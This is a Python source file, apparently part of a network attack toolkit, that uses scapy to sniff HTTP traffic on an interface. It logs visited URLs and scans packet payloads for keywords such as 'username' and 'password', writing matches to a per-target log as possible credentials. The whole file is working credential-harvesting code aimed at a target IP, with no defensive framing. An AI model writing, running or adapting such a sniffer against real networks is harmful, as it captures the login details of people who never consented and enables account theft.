import scapy.all as scapy
from scapy.layers import http
import threading
import os
import time

class Sniff:
    @staticmethod
    def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    @staticmethod
    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            try:
                load = load.decode('utf-8', errors='ignore')
                keywords = ["username", "user", "login", "password", "pass"]
                for keyword in keywords:
                    if keyword in load:
                        return load
            except Exception:
                pass
        return None

    @staticmethod
    def process_sniffed_packet(packet, log_filepath):
        if packet.haslayer(http.HTTPRequest):
            url = Sniff.get_url(packet)
            try:
                url_str = url.decode('utf-8')
            except:
                url_str = str(url)
            log_entry = f"[+] HTTP Request >> {url_str}\n"
            
            login_info = Sniff.get_login_info(packet)
            if login_info:
                log_entry += f"[**] Possible User/Password >> {login_info}\n"
                
            if url_str or login_info:
                with open(log_filepath, "a") as f:
                    f.write(log_entry)

    @staticmethod
    def _sniff_thread(interface, target_ip, control_filepath, log_filepath):
        while os.path.exists(control_filepath):
            # Using sniff with a timeout so the while loop can check the control file
            scapy.sniff(
                iface=interface,
                store=False,
                prn=lambda pkt: Sniff.process_sniffed_packet(pkt, log_filepath),
                timeout=2
            )
            time.sleep(0.1)

    @staticmethod
    def start_sniff(interface, target_ip):
        os.makedirs('threads', exist_ok=True)
        name_watcher = f"{target_ip}_sniff"
        control_filepath = f"threads/{name_watcher}_control"
        log_filepath = f"threads/{target_ip}_sniff_log.txt"
        
        if not os.path.exists(control_filepath):
            open(control_filepath, 'w').close()
            
        thread = threading.Thread(
            target=Sniff._sniff_thread, 
            args=(interface, target_ip, control_filepath, log_filepath),
            name="SniffThread"
        )
        thread.start()

    @staticmethod
    def stop_sniff(target_ip):
        name_watcher = f"{target_ip}_sniff"
        control_filepath = f"threads/{name_watcher}_control"
        if os.path.exists(control_filepath):
            os.remove(control_filepath)